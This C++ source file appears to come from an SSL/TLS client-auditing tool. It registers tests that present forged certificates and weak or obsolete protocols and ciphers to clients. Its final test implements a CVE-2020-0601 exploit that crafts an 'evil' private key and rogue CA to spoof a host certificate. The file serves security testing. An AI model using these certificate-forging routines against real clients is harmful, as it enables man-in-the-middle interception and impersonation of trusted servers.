
#include "ssltests.h"
#include "sslcertgen.h"
#include "debug.h"
#include "sslusersettings.h"
#include "openssl-helper.h"
#include "cve-2020-0601_poc.h"

#ifdef UNSAFE_QSSL
#include "sslunsafeconfiguration.h"
#else
#include <QSslConfiguration>
#endif


SslTestsFactory<SslTest> sslTestsFactory;

void fillSslTestsFactory()
{
    // using 'switch ()' to be sure that all tests are registered
    for (int i = 0; i < static_cast<int>(SslTestId::SslTestNonexisting); i++) {
        switch (static_cast<SslTestId>(i)) {
#define ADD_SSLTEST_CASE(type) \
        case SslTestId::type: \
            sslTestsFactory.registerType<type>(SslTestId::type); \
        break;

        ADD_SSLTEST_CASE(SslTestCertCustom1);
        ADD_SSLTEST_CASE(SslTestCertSS1);
        ADD_SSLTEST_CASE(SslTestCertSS2);
        ADD_SSLTEST_CASE(SslTestCertCustom2);
        ADD_SSLTEST_CASE(SslTestCertCustom3);
        ADD_SSLTEST_CASE(SslTestCertCA1);
        ADD_SSLTEST_CASE(SslTestCertCA2);
        ADD_SSLTEST_CASE(SslTestProtoSsl2);
        ADD_SSLTEST_CASE(SslTestProtoSsl3);
        ADD_SSLTEST_CASE(SslTestCiphersSsl3Exp);
        ADD_SSLTEST_CASE(SslTestCiphersSsl3Low);
        ADD_SSLTEST_CASE(SslTestCiphersSsl3Med);
        ADD_SSLTEST_CASE(SslTestProtoTls10);
        ADD_SSLTEST_CASE(SslTestCiphersTls10Exp);
        ADD_SSLTEST_CASE(SslTestCiphersTls10Low);
        ADD_SSLTEST_CASE(SslTestCiphersTls10Med);
        ADD_SSLTEST_CASE(SslTestCiphersTls11Exp);
        ADD_SSLTEST_CASE(SslTestCiphersTls11Low);
        ADD_SSLTEST_CASE(SslTestCiphersTls11Med);
        ADD_SSLTEST_CASE(SslTestCiphersTls12Exp);
        ADD_SSLTEST_CASE(SslTestCiphersTls12Low);
        ADD_SSLTEST_CASE(SslTestCiphersTls12Med);
        ADD_SSLTEST_CASE(SslTestCiphersDtls10Exp);
        ADD_SSLTEST_CASE(SslTestCiphersDtls10Low);
        ADD_SSLTEST_CASE(SslTestCiphersDtls10Med);
        ADD_SSLTEST_CASE(SslTestCiphersDtls12Exp);
        ADD_SSLTEST_CASE(SslTestCiphersDtls12Low);
        ADD_SSLTEST_CASE(SslTestCiphersDtls12Med);
        ADD_SSLTEST_CASE(SslTestCertCve20200601);

        case SslTestId::SslTestNonexisting:
            break;
        }
    }
}

bool SslTestCertCustom1::prepare(const SslUserSettings *settings)
{
    // if user did not provide a certificate, do not emit error, just skip test initialization
    if (settings->getUserCertPath().isEmpty()) {
        return false;
    }

    QList<XSslCertificate> chain = settings->getUserCert();
    if (chain.size() == 0) {
        RED("can not parse user-supplied certificate");
        return false;
    }

    m_localCertsChain = chain;

    XSslKey key = settings->getUserKey();
    if (key.isNull()) {
        RED("can not parse user-supplied key");
        return false;
    }

    m_privateKey = key;

    m_sslCiphers = settings->getSupportedCiphers().count() ?
                settings->getSupportedCiphers() : XSslConfiguration::supportedCiphers();

    // DTLS mode requires specific protocol to be set
    if (settings->getUseDtls()) {
        m_sslProtocol = XSsl::DtlsV1_0OrLater;
    } else {
        m_sslProtocol = XSsl::AnyProtocol;
    }

    return true;
}


bool SslTestCertSS1::prepare(const SslUserSettings *settings)
{
    QPair<XSslCertificate, XSslKey> cert;

    if (settings->getUserCN().length() != 0) {
        QString cn = settings->getUserCN();

        cert = SslCertGen::genSignedCert(cn);
    } else if (settings->getServerAddr().length() != 0) {
        XSslCertificate basecert = settings->getPeerCertificates().first();

        cert = SslCertGen::genSignedCertFromTemplate(basecert);
    } else {
        return false;
    }

    QList<XSslCertificate> chain;
    chain << cert.first;

    m_localCertsChain = chain;
    m_privateKey = cert.second;

    m_sslCiphers = settings->getSupportedCiphers().count() ?
                settings->getSupportedCiphers() : XSslConfiguration::supportedCiphers();

    // DTLS mode requires specific protocol to be set
    if (settings->getUseDtls()) {
        m_sslProtocol = XSsl::DtlsV1_0OrLater;
    } else {
        m_sslProtocol = XSsl::AnyProtocol;
    }

    return true;
}


bool SslTestCertSS2::prepare(const SslUserSettings *settings)
{
    QPair<XSslCertificate, XSslKey> cert = SslCertGen::genSignedCert("www.example.com");

    QList<XSslCertificate> chain;
    chain << cert.first;

    m_localCertsChain = chain;
    m_privateKey = cert.second;

    m_sslCiphers = settings->getSupportedCiphers().count() ?
                settings->getSupportedCiphers() : XSslConfiguration::supportedCiphers();

    // DTLS mode requires specific protocol to be set
    if (settings->getUseDtls()) {
        m_sslProtocol = XSsl::DtlsV1_0OrLater;
    } else {
        m_sslProtocol = XSsl::AnyProtocol;
    }

    return true;
}


bool SslTestCertCustom2::prepare(const SslUserSettings *settings)
{
    QPair<QList<XSslCertificate>, XSslKey> generatedCert;

    QList<XSslCertificate> chain = settings->getUserCert();
    if (chain.size() == 0)
        return false;

    XSslKey key = settings->getUserKey();
    if (key.isNull())
        return false;

    if (settings->getUserCN().length() != 0) {
        QString cn = settings->getUserCN();

        generatedCert = SslCertGen::genSignedByCACert(cn, chain.at(0), key);
    } else if (settings->getServerAddr().length() != 0) {
        XSslCertificate basecert = settings->getPeerCertificates().first();

        generatedCert = SslCertGen::genSignedByCACertFromTemplate(basecert, chain.at(0), key);
    } else {
        return false;
    }

    generatedCert.first << chain.mid(1); // create full chain of certificates (if user provided)

    m_localCertsChain = generatedCert.first;
    m_privateKey = generatedCert.second;

    m_sslCiphers = settings->getSupportedCiphers().count() ?
                settings->getSupportedCiphers() : XSslConfiguration::supportedCiphers();

    // DTLS mode requires specific protocol to be set
    if (settings->getUseDtls()) {
        m_sslProtocol = XSsl::DtlsV1_0OrLater;
    } else {
        m_sslProtocol = XSsl::AnyProtocol;
    }

    return true;
}


bool SslTestCertCustom3::prepare(const SslUserSettings *settings)
{
    QList<XSslCertificate> chain = settings->getUserCert();
    if (chain.size() == 0)
        return false;

    XSslKey key = settings->getUserKey();
    if (key.isNull())
        return false;

    QPair<QList<XSslCertificate>, XSslKey> generatedCert = SslCertGen::genSignedByCACert("www.example.com", chain.at(0), key);

    generatedCert.first << chain.mid(1); // create full chain of certificates (if user provided)

    m_localCertsChain = generatedCert.first;
    m_privateKey = generatedCert.second;

    m_sslCiphers = settings->getSupportedCiphers().count() ?
                settings->getSupportedCiphers() : XSslConfiguration::supportedCiphers();

    // DTLS mode requires specific protocol to be set
    if (settings->getUseDtls()) {
        m_sslProtocol = XSsl::DtlsV1_0OrLater;
    } else {
        m_sslProtocol = XSsl::AnyProtocol;
    }

    return true;
}


bool SslTestCertCA1::prepare(const SslUserSettings *settings)
{
    QString cn;

    if (settings->getUserCN().length() != 0) {
        cn = settings->getUserCN();
    } else if (settings->getServerAddr().length() != 0) {
        cn = settings->getPeerCertificates().first().subjectInfo(XSslCertificate::CommonName).first();
    } else {
        return false;
    }

    QList<XSslCertificate> chain = settings->getUserCaCert();
    if (chain.size() == 0)
        return false;

    XSslKey key = settings->getUserCaKey();
    if (key.isNull())
        return false;


    QPair<QList<XSslCertificate>, XSslKey> generatedCert = SslCertGen::genSignedByCACert(cn, chain.at(0), key);

    generatedCert.first << chain.mid(1); // create full chain of certificates (if user provided)

    m_localCertsChain = generatedCert.first;
    m_privateKey = generatedCert.second;

    m_sslCiphers = settings->getSupportedCiphers().count() ?
                settings->getSupportedCiphers() : XSslConfiguration::supportedCiphers();

    // DTLS mode requires specific protocol to be set
    if (settings->getUseDtls()) {
        m_sslProtocol = XSsl::DtlsV1_0OrLater;
    } else {
        m_sslProtocol = XSsl::AnyProtocol;
    }

    return true;
}


bool SslTestCertCA2::prepare(const SslUserSettings *settings)
{
    QList<XSslCertificate> chain = settings->getUserCaCert();
    if (chain.size() == 0)
        return false;

    XSslKey key = settings->getUserCaKey();
    if (key.isNull())
        return false;

    QPair<QList<XSslCertificate>, XSslKey> generatedCert = SslCertGen::genSignedByCACert("www.example.com", chain.at(0), key);

    generatedCert.first << chain.mid(1); // create full chain of certificates (if user provided)

    m_localCertsChain = generatedCert.first;
    m_privateKey = generatedCert.second;

    m_sslCiphers = settings->getSupportedCiphers().count() ?
                settings->getSupportedCiphers() : XSslConfiguration::supportedCiphers();

    // DTLS mode requires specific protocol to be set
    if (settings->getUseDtls()) {
        m_sslProtocol = XSsl::DtlsV1_0OrLater;
    } else {
        m_sslProtocol = XSsl::AnyProtocol;
    }

    return true;
}


bool SslTestProtoSsl2::setProtoAndCiphers()
{
    return setProtoAndSupportedCiphers(XSsl::SslV2);
}


bool SslTestProtoSsl3::setProtoAndCiphers()
{
    return setProtoAndSupportedCiphers(XSsl::SslV3);
}


bool SslTestCiphersSsl3Exp::setProtoAndCiphers()
{
    return setProtoAndExportCiphers(XSsl::SslV3);
}


bool SslTestCiphersSsl3Low::setProtoAndCiphers()
{
    return setProtoAndLowCiphers(XSsl::SslV3);
}


bool SslTestCiphersSsl3Med::setProtoAndCiphers()
{
    return setProtoAndMediumCiphers(XSsl::SslV3);
}


bool SslTestProtoTls10::setProtoAndCiphers()
{
    return setProtoAndSupportedCiphers(XSsl::TlsV1_0);
}


bool SslTestCiphersTls10Exp::setProtoAndCiphers()
{
    return setProtoAndExportCiphers(XSsl::TlsV1_0);
}


bool SslTestCiphersTls10Low::setProtoAndCiphers()
{
    return setProtoAndLowCiphers(XSsl::TlsV1_0);
}


bool SslTestCiphersTls10Med::setProtoAndCiphers()
{
    return setProtoAndMediumCiphers(XSsl::TlsV1_0);
}


bool SslTestCiphersTls11Exp::setProtoAndCiphers()
{
    return setProtoAndExportCiphers(XSsl::TlsV1_1);
}


bool SslTestCiphersTls11Low::setProtoAndCiphers()
{
    return setProtoAndLowCiphers(XSsl::TlsV1_1);
}


bool SslTestCiphersTls11Med::setProtoAndCiphers()
{
    return setProtoAndMediumCiphers(XSsl::TlsV1_1);
}


bool SslTestCiphersTls12Exp::setProtoAndCiphers()
{
    return setProtoAndExportCiphers(XSsl::TlsV1_2);
}


bool SslTestCiphersTls12Low::setProtoAndCiphers()
{
    return setProtoAndLowCiphers(XSsl::TlsV1_2);
}


bool SslTestCiphersTls12Med::setProtoAndCiphers()
{
    return setProtoAndMediumCiphers(XSsl::TlsV1_2);
}

bool SslTestCiphersDtls10Exp::setProtoAndCiphers()
{
    return setProtoAndExportCiphers(XSsl::DtlsV1_0);
}


bool SslTestCiphersDtls10Low::setProtoAndCiphers()
{
    return setProtoAndLowCiphers(XSsl::DtlsV1_0);
}


bool SslTestCiphersDtls10Med::setProtoAndCiphers()
{
    return setProtoAndMediumCiphers(XSsl::DtlsV1_0);
}

bool SslTestCiphersDtls12Exp::setProtoAndCiphers()
{
    return setProtoAndExportCiphers(XSsl::DtlsV1_2);
}


bool SslTestCiphersDtls12Low::setProtoAndCiphers()
{
    return setProtoAndLowCiphers(XSsl::DtlsV1_2);
}


bool SslTestCiphersDtls12Med::setProtoAndCiphers()
{
    return setProtoAndMediumCiphers(XSsl::DtlsV1_2);
}

bool SslTestCertCve20200601::prepare(const SslUserSettings *settings)
{
    XSslCertificate caCert;
    QByteArray caSN;
    QByteArray caPubKey;
    QString targetCN;
    bool ret = false;

    // if user provided CA cert, use it as a base one
    QList<XSslCertificate> chain = settings->getUserCaCert();
    if (chain.size() == 0) {
        // ok, no CA cert, may be remote server is provided?
        if (settings->getServerAddr().length() != 0) {
            // assume that CA will be last in the list
            caCert = settings->getPeerCertificates().last();
            // get common name of the host
            targetCN = settings->getPeerCertificates().first().subjectInfo(XSslCertificate::CommonName).first();
        }
    } else {
        caCert = chain.at(0);
    }

    if (caCert.isNull()) {
        VERBOSE("\tCVE-2020-0601: no CA certificate provided");
        return false;
    }

    // CA has to be self-signed
    if (!caCert.isSelfSigned()) {
        VERBOSE("\tCVE-2020-0601: the provided certificate is not a CA");
        return false;
    }

    // check if the certificate is signed using ECC
    if (caCert.publicKey().algorithm() != XSsl::Ec) {
        VERBOSE("\tCVE-2020-0601: the provided CA certificate is not signed using ECC");
        return false;
    }

    // extract raw public key and serial number of the provided certificate
    caSN.resize(8192);
    size_t caSNLen = 0;
    getCertSerial(caCert.toPem().constData(), caCert.toPem().size(),
                  (unsigned char *)caSN.data(), 8192, &caSNLen,
                  true);
    caSN.resize(caSNLen);

    caPubKey.resize(8192);
    size_t caPubKeyLen = 0;
    ret = getCertPublicKey(caCert.toPem().constData(), caCert.toPem().size(),
                           (unsigned char *)caPubKey.data(), &caPubKeyLen,
                           true);
    if (!ret) {
        VERBOSE("\tCVE-2020-0601: failed to extract public key");
        return false;
    }

    caPubKey.resize(caPubKeyLen);

    // decide what target common name to use
    if (settings->getUserCN().size() > 0) {
        targetCN = settings->getUserCN();
    }
    if (targetCN.size() == 0) {
        targetCN = "www.example.com";
    }

    // input data is ready now we can craft evil certificates

    // craft evil private key which generates the desired public key
    char evilPrivKeyPKCS8[16384];
    size_t evilPrivKeyPKCS8Len;
    ret = craftEvilPrivKey(caPubKey.constData(), caPubKey.size(),
                           evilPrivKeyPKCS8, sizeof(evilPrivKeyPKCS8), &evilPrivKeyPKCS8Len,
                           false, NULL);
    if (!ret) {
        VERBOSE("\tCVE-2020-0601: failed to craft evil private key");
        return false;
    }

    // convert this private key to PEM format
    char evilPrivKeyPem[16384];
    size_t evilPrivKeyPemLen;
    ret = pkcs8PrivKeyToPem(evilPrivKeyPKCS8, evilPrivKeyPKCS8Len,
                            evilPrivKeyPem, sizeof(evilPrivKeyPem), &evilPrivKeyPemLen,
                            false, NULL);
    if (!ret) {
        VERBOSE("\tCVE-2020-0601: failed to convert evil private key to PEM");
        return false;
    }

    // create our rogue CA with the same serial number as the original one
    // sign it with evil private key
    unsigned char evilCaCert[16384];
    size_t evilCaCertLen;
    ret = genSignedCaCertWithSerial(caSN.constData(),
                                    (const char *)evilPrivKeyPem, evilPrivKeyPemLen,
                                    evilCaCert, sizeof(evilCaCert), &evilCaCertLen,
                                    false, NULL);
    if (!ret) {
        VERBOSE("\tCVE-2020-0601: failed to sign custom CA");
        return false;
    }

    // generate a certificate for the provided common name which is signed by the evil CA
    unsigned char hostCert[8192];
    size_t hostCertLen;
    unsigned char hostKey[8192];
    size_t hostKeyLen;
    ret = genSignedCertForCN(targetCN.toLocal8Bit().constData(),
                             (const char *)evilCaCert, evilCaCertLen,
                             (const char *)evilPrivKeyPem, evilPrivKeyPemLen,
                             hostKey, sizeof(hostKey), &hostKeyLen,
                             hostCert, sizeof(hostCert), &hostCertLen,
                             false, NULL, NULL);
    if (!ret) {
        VERBOSE("\tCVE-2020-0601: failed to generate certificate for target common name");
        return false;
    }

    // we have certificates and keys in raw format, convert them to Qt types
    XSslCertificate evilCaCertQt(QByteArray::fromRawData((const char *)evilCaCert, evilCaCertLen),
                                 XSsl::Pem);
    XSslCertificate hostCertQt(QByteArray::fromRawData((const char *)hostCert, hostCertLen),
                               XSsl::Pem);
    XSslKey hostKeyQt(QByteArray::fromRawData((const char *)hostKey, hostKeyLen),
                      XSsl::Ec, XSsl::Pem, XSsl::PrivateKey);

    if (evilCaCertQt.isNull() || hostCertQt.isNull() || hostKeyQt.isNull()) {
        VERBOSE("\tCVE-2020-0601: failed to switch to Qt types");
        return false;
    }

    // finally, fill class members with crafted certificates
    m_localCertsChain << hostCertQt;
    m_localCertsChain << evilCaCertQt; // providing CA is obligatory
    m_privateKey = hostKeyQt;

    m_sslCiphers = XSslConfiguration::supportedCiphers();
    // DTLS mode requires specific protocol to be set
    if (settings->getUseDtls()) {
        m_sslProtocol = XSsl::DtlsV1_0OrLater;
    } else {
        m_sslProtocol = XSsl::AnyProtocol;
    }

    return true;
}
